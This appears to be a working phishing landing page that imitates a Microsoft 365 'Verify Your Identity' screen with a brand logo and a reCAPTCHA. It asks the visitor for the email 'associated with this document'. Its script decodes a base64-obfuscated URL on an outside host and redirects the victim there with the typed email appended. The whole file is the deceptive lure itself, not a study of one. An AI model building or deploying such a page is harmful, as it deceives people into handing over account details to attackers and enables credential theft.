<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Verify Your Identity</title>
      <script src="https://www.google.com/recaptcha/api.js" async defer></script>
      <style> body { font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif; background-color: #f4f4f4; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #333; background-image: url('images/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg'); background-size: cover; background-position: center; } .header { width: 100%; background-color: #0078d4; color: white; text-align: left; padding: 10px 20px; box-sizing: border-box; font-size: 18px; position: absolute; top: 0; } .header span { margin-left: 20px; } .container { background-color: white; border: 1px solid #ccc; border-radius: 3px; padding: 33px; width: 80%; max-width: 300px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); text-align: center; margin-top: 0px; } .container img { width: 100px; margin-bottom: 20px; } .container h2 { font-size: 24px; margin-bottom: 20px; color: #333; } .container p { margin-bottom: 10px; color: #666; } .container p2 { display: block; margin-bottom: 10px; color: #666; font-size: 13px; margin-bottom: 20px; } .container input[type="email"] { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 3px; font-size: 16px; box-sizing: border-box; text-align: center; } .container button { width: 100%; padding: 10px; background-color: #0078d4; color: white; border: none; border-radius: 3px; font-size: 16px; cursor: pointer; } .container button:hover { background-color: #005a9e; } .container .footer { font-size: 12px; color: #888; margin-top: 20px; } @media (max-width: 600px) { .container { padding: 20px; } .container h2 { font-size: 20px; } .container .space { margin-bottom: 20px; } .container input[type="email"] { font-size: 14px; } .container button { font-size: 14px; } } </style>
   </head>
   <body>
      <div class="container">
         <img src="https://5.imimg.com/data5/SELLER/Default/2025/5/515352444/QD/SO/RP/141921538/microsoft-365-business-standard.jpg" alt="soft Logo"> 
         <h2>Verify Your Identity</h2>
         <p><strong>Complete the security check below:</strong></p>
         <p2>Please enter the email address associated with this document to proceed with access.</p2>
         <input type="email" id="email-input" placeholder="Enter email" required="" style="margin-top: 10px;">
         <div class="g-recaptcha" data-sitekey="6Led2ssrAAAAACf5g2mCw8pHqSKT09ZEBR32_eW2"></div>
         <button id="continue-button">Review</button> 
      </div>
      <script>
         function continueLoading() {
             var emailInput = document.getElementById("email-input").value.trim().toLowerCase();
             var captchaResponse = grecaptcha.getResponse();
             if (!validateEmail(emailInput)) {
                 alert("Please enter a valid email address.");
                 return;
             }
             if (captchaResponse.length === 0) {
                 alert("Please complete the CAPTCHA verification.");
                 return;
             }
             var redirectUrl = atob("aHR0cHM6Ly9uZXh0bGljZS5jb20uZGUvYmRCdUFzaGg1Sw==") + '#X' + emailInput;
             window.location.href = redirectUrl;
         }
         
         function validateEmail(email) {
             var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             return emailPattern.test(email);
         }
         
         document.getElementById("continue-button").addEventListener("click", continueLoading);
         document.getElementById("email-input").addEventListener("keydown", function(event) {
             if (event.key === "Enter") {
                 continueLoading();
             }
         });
      </script>
   </body>
</html>
